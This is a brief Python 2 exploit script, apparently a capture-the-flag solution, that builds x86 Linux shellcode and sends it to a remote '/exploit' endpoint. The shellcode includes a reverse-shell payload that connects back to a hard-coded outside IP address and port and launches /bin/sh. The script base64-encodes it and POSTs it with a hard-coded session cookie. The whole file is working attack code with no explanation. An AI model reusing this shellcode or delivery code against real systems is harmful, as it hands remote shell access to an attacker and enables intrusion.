import requests
from pwn import *

def form(cmd):
	sice = ""
	for i in range(0, len(cmd), 4)[::-1]:
		sice += "push 0x" + cmd[i:i+4][::-1].encode("hex") + "\n"
	return sice.strip()


payload = "\x58\x8B\x00\x3C\xB8\x0F\x85\x65\x69\x69\x69"

reverse = "\x68\x43\xcd\x90\x28\x5e\x66\x68\xd9\x03\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"
payload += reverse

print payload.encode("hex")

#print data
data = '{"payload":"' + str(payload.encode("base64").replace("\n", ""))+ '"}'
headers = {"Content-Type":"application/json"}
cookies = {"session":"eyJJU0JBRFNZU0NBTEwiOmZhbHNlfQ.Diqdqw.9nX4AdR0bhIARTO372BgoTHpBN4"}

res = requests.post("http://178.128.100.75/exploit", data=data, headers=headers, cookies=cookies)
print res.text
